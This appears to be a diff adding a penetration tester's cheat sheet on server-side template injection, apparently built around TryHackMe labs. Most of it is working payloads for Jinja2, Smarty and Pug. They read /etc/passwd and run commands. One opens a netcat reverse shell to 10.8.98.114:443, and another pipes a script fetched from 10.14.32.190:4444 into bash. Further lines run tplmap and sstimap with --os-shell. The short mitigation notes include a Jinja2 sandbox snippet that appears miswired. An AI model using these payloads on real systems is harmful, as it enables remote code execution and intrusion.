@@ -1,0 +1,118 @@
+### ssti ###
+## links ##
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection
+# https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-server-side-template-injection
+# https://tryhackme.com/r/room/serversidetemplateinjection
+
+
+##############
+## examples ##
+##############
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/etc/passwd').read()}}	# read passwd
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}		# exec id
+# little enum
+{{config.__class__.__init__.__globals__['os'].popen('id;whoami;echo "";which nc bash curl wget;echo "";sestatus 2>&1;aa-status 2>&1;echo "";cat /etc/*-release;echo"";cat /etc/iptables/*').read()}}
+# reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;nc 10.8.98.114 443 0</tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f').read()}}
+
+
+##########
+## FUZZ ##
+##########
+${ {{ <% {% [% ' " }} } %
+${7*7} a{*comment*}b     => Smarty
+${7*7} ${"z".join("ab")} => Mako
+{{7*7}} {{7*'7'}}        => Jinja2 / Twig
+#{7*7}			 => Pug / Jade
+
+
+############
+## Smarty ##
+############
+{'Hello'|upper}
+{system("ls")}
+
+# mitigation, no php tags
+$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
+$smarty->disable_security = false;
+
+
+############
+## Jinja2 ##
+############
+http://$h/profile/{{ ''.__class__ }}						# current class
+http://$h/profile/{{ ''.__class__.__mro__ }}					# climb up on object tree
+http://$h/profile/{{ ''.__class__.__mro__[1] }}					# select root object index
+http://$h/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}		# list subclass of object
+http://$h/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}		# look for subprocess.Popen index
+http://$h/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami",shell=True,stdout=-1).communicate() }}
+
+{{ ''.__class__.__mro__[1].__subclasses__()[157] }}				# or find _sitebuiltins._Helper
+{{ "".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
+
+# mitigation, sandbox mode
+from jinja2 import Environment, select_autoescape, sandbox
+
+env = Environment(
+    autoescape=select_autoescape(['html', 'xml']),
+    extensions=[sandbox.SandboxedEnvironment]
+)
+
+
+#########
+## Pug ##
+#########
+#{7*7}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.14.32.190:4444/s.sh | bash')}()}
+#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
+#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
+
+# index.pug example
+doctype html
+html(lang='en')
+ head
+   title Hello, World!
+ body
+   h1 Hello, World!
+   p Hi #{name}
+
+# mitigation, no js eval
+var user = !{JSON.stringify(user)}
+
+
+#########
+## GET ##
+#########
+tplmap -u http://$h/?param
+
+
+##########
+## POST ##
+##########
+tplmap -u http://$h/ -d 'param'
+tplmap -u http://$h/ -d 'param' -e Jinja2 --os-cmd 'id'
+tplmap -u http://$h/ -d 'param' --os-cmd 'id'
+tplmap -u http://$h/ -d 'param' --os-shell
+
+
+## sstimap
+cd /opt/SSTImap
+python sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
+python sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page=' --os-shell
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
